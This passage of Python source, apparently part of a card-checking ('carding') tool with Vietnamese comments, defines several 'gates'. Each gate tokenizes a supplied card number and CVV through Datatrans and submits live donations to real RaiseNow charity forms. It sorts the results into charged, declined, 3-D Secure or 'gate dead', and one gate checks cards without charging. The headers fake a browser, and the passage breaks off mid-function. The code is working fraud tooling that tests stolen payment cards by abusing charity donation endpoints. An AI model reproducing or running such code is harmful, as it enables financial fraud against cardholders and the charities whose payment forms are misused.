        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }
        
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment: {error}", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect","url":"https:\\/\\/hooks.stripe.com\\/3d_secure_2\\/hosted?merchant=' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 1 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 1: {e}", bin_info

def _check_card_gate2(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 2"""
    try:
        charge_value = _get_charge_value('2', custom_charge_amount)
        brand_upper = (bin_info.get('brand') or '').upper()
        payment_method = BRAND_TO_PAYMENT_METHOD.get(brand_upper, 'VIS')
        brand_code = payment_method.lower()

        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250801203254539560", "cardNumber": cc, "cvv": cvv, "paymentMethod": payment_method, "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=0cjn3q43b", "X-Requested-With": "XMLHttpRequest" }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info

        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "079beaee-ca86-4b8c-9d08-e71b4bd0a40e", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": charge_value}, "supporter": {"locale": "de", "first_name": "Minh", "last_name": "Nhut", "email": "minhnhat.144417@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}, "street": "Oakridge Farm Lane", "house_number": "2830", "postal_code": "424242", "city": "cc"}, "raisenow_parameters": {"analytics": {"channel": "embed", "preselected_amount": "5000", "suggested_amounts": "[5000,10000,15000]", "user_agent": ua}, "solution": {"uuid": "3f9c8a06-2d0b-4497-b627-e3ba34069ad2", "name": "Online-Spende", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": ""}, "payment_information": {"brand_code": brand_code, "cardholder": "Minh Nhut", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "1d7dd23e-7007-4d3b-85b7-00891d2c6df5", "return_url": "https://donate.raisenow.io/xdcxy?analytics.channel=embed&lng=de&rnw-view=payment_result" }
        payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/" }

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment: {error}", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 2 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 2: {e}", bin_info

def _check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 3"""
    try:
        charge_value = _get_charge_value('3', custom_charge_amount)
        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250802045852818974",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "VIS", # Hardcoded as per request
            "merchantId": "3000022877",
            "browserUserAgent": ua,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=x0gzkbt03",
            "X-Requested-With": "XMLHttpRequest"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info

        # Step 2: Make payment request
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = {
            "account_uuid": "bda022a8-9955-419d-b949-037e64ef6294",
            "test_mode": False,
            "create_supporter": False,
            "amount": {"currency": "EUR", "value": charge_value},
            "supporter": {
                "locale": "de",
                "first_name": "Minh",
                "last_name": "Nhat",
                "email": "minhnhat.144417@gmail.com",
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "embed",
                    "preselected_amount": "2500",
                    "suggested_amounts": "[2500,5000,10000]",
                    "user_agent": ua
                },
                "solution": {"uuid": "9b693323-de98-41da-85f6-74c8aa32d2dd", "name": "Allgemein", "type": "donate"},
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/jpctq?analytics.channel=embed&lng=de",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {"donation_receipt_requested": "false"}
            },
            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "vis",
                "cardholder": "Minh Nhat",
                "expiry_month": mes,
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "b2fbfb20-3195-4730-b569-4db7134e2dff",
            "return_url": "https://donate.raisenow.io/jpctq?analytics.channel=embed&lng=de&rnw-view=payment_result"
        }
        payment_headers = {
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/"
        }

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment: {error}", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 3 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 3: {e}", bin_info

def _check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 4"""
    try:
        charge_value = _get_charge_value('4', custom_charge_amount)
        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250802080040638504",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        tokenize_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=32stkhqhm",
            "X-Requested-With": "XMLHttpRequest"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info

        # Step 2: Make payment request
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = {
            "account_uuid": "0e83cbe3-4186-4fbf-a8e2-4c319e8902c2",
            "test_mode": False,
            "create_supporter": False,
            "amount": {"currency": "EUR", "value": charge_value},
            "supporter": {
                "locale": "en",
                "first_name": "Minh",
                "last_name": "Nhat",
                "email": "minhnhat.144417@gmail.com",
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}},
                "street": "Oakridge Farm Lane",
                "house_number": "2830",
                "postal_code": "424242",
                "city": "West Allis",
                "country": "VN"
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "embed",
                    "preselected_amount": "2500",
                    "suggested_amounts": "[2500,5000,15000]",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
                },
                "solution": {"uuid": "7562d73f-6a18-4605-a534-47196396ad54", "name": "EDRi Form", "type": "donate"},
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en",
                    "uuid": "self-service",
                    "version": "2.16.0"
                }
            },
            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "eca",
                "cardholder": "Minh Nhat",
                "expiry_month": mes,
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "56d3c80c-6e0a-4702-bdce-5f6e09b071d0",
            "return_url": "https://donate.raisenow.io/psrkq?analytics.channel=embed&lng=en&rnw-view=payment_result"
        }
        payment_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/"
        }

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment: {error}", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
        else: return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 4 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 4: {e}", bin_info

def _check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 5"""
    try:
        charge_value = _get_charge_value('5', custom_charge_amount)
        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250802162822879268",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=mrw5i3faj",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info

        # Step 2: Make payment request
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = {
            "account_uuid": "ed99e982-2f16-4643-be9d-9b31a66c3edf",
            "test_mode": False,
            "create_supporter": False,
            "amount": {"currency": "CHF", "value": charge_value},
            "supporter": {
                "locale": "de",
                "first_name": "Minh",
                "last_name": "Nhat",
                "email": "minhnhat4417@gmail.com",
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "5000",
                    "suggested_amounts": "[5000,12500,25000]",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
                },
                "solution": {"uuid": "09f67512-414e-4a70-ac58-08b999c47007", "name": "Spendenformular Blindenmuseum", "type": "donate"},
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/dbhrx?lng=de",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {"donation_receipt_requested": "false"}
            },
            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "eca",
                "cardholder": "Minh Nhat",
                "expiry_month": mes,
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032",
            "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result"
        }
        payment_headers = {
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
        }

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment: {error}", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text:
            return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text:
            return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text:
            return 'custom', line, response_text, bin_info
        else:
            return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 5 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 5: {e}", bin_info

def _check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 6"""
    try:
        charge_value = _get_charge_value('6', custom_charge_amount)
        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250802205541759546",
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info

        # Step 2: Make payment request
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = {
            "account_uuid": "aa5124b6-2912-4ba1-b8ce-f43915685214",
            "test_mode": False,
            "create_supporter": False,
            "amount": {"currency": "CHF", "value": charge_value},
            "supporter": {
                "locale": "en",
                "first_name": "Minh",
                "last_name": "Nhat",
                "email_permission": False,
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
            },
            "raisenow_parameters": {
                "analytics": {
                    "channel": "paylink",
                    "preselected_amount": "5000",
                    "suggested_amounts": "[5000,10000,15000]",
                    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
                },
                "solution": {"uuid": "d2c90617-8e65-4447-a5c3-c2975b1716c2", "name": "Campagne de dons mindsUP", "type": "donate"},
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/fxdnk?lng=en",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {"donation_receipt_requested": "false"}
            },
            "custom_parameters": {"campaign_id": "mindsup", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "eca",
                "cardholder": "Minh Nhat",
                "expiry_month": mes,
                "expiry_year": ano,
                "transaction_id": transaction_id
            },
            "profile": "eccfaccc-7730-4875-8aed-c8b2535ecc28",
            "return_url": "https://donate.raisenow.io/fxdnk?lng=en&rnw-view=payment_result"
        }
        payment_headers = {
            "Content-Type": "application/json",
            "Origin": "https://donate.raisenow.io",
            "Referer": "https://donate.raisenow.io/",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment: {error}", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        if '"payment_status":"succeeded"' in response_text:
            return 'success', line, f'CHARGED_{charge_value}', bin_info
        elif '"payment_status":"failed"' in response_text:
            return 'decline', line, response_text, bin_info
        elif '"action":{"action_type":"redirect"' in response_text:
            return 'custom', line, response_text, bin_info
        elif '"3d_secure_2"' in response_text:
            return 'custom', line, response_text, bin_info
        else:
            return 'unknown', line, response_text, bin_info
    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 6 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 6: {e}", bin_info

def _check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """
    Logic cho Gate 7 - Check Live (Kh√¥ng charge).
    - Tr·∫£ v·ªÅ 'live_success' n·∫øu th·∫ª y√™u c·∫ßu 3D Secure.
    - C√°c tr∆∞·ªùng h·ª£p kh√°c (failed, error, unknown) ƒë∆∞·ª£c coi l√† 'decline'.
    """
    try:
        random_first_name = generate_random_name(random.randint(4, 8))
        random_last_name = generate_random_name(random.randint(4, 8))
        random_cardholder = f"{random_first_name} {random_last_name}"

        # Step 1: Tokenize card
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE", "formId": "250802162822879268", "cardNumber": cc,
            "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877",
            "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "vi-VN",
            "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420"
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=mrw5i3faj",
            "X-Requested-With": "XMLHttpRequest", "User-Agent": ua, "Accept": "*/*",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5",
            "Cache-Control": "no-cache", "Connection": "keep-alive", "Pragma": "no-cache",
            "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info

        # Step 2: Make payment source request (non-charging check)
        payment_url = "https://api.raisenow.io/payment-sources"
        payment_payload = {
            "account_uuid": "ed99e982-2f16-4643-be9d-9b31a66c3edf", "test_mode": False,
            "create_supporter": False, "amount": {"currency": "CHF", "value": 50},
            "supporter": {
                "locale": "de", 
                "first_name": random_first_name,
                "last_name": random_last_name,
                "email": "minhnhat4417@gmail.com", 
                "email_permission": False, 
                "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
            },
            "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,12500,25000]", "user_agent": ua}, "solution": {"uuid": "09f67512-414e-4a70-ac58-08b999c47007", "name": "Spendenformular Blindenmuseum", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/dbhrx?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}},
            "custom_parameters": {"campaign_id": "", "campaign_subid": ""},
            "payment_information": {
                "brand_code": "eca", 
                "cardholder": random_cardholder,
                "expiry_month": mes, 
                "expiry_year": ano, 
                "transaction_id": transaction_id
            },
            "profile": "5acd9b09-387a-4a89-a090-13b16c4a0032", "return_url": "https://donate.raisenow.io/dbhrx?lng=de&rnw-view=payment_result"
        }
        payment_headers = {
            "Content-Type": "application/json", "Origin": "https://donate.raisenow.io",
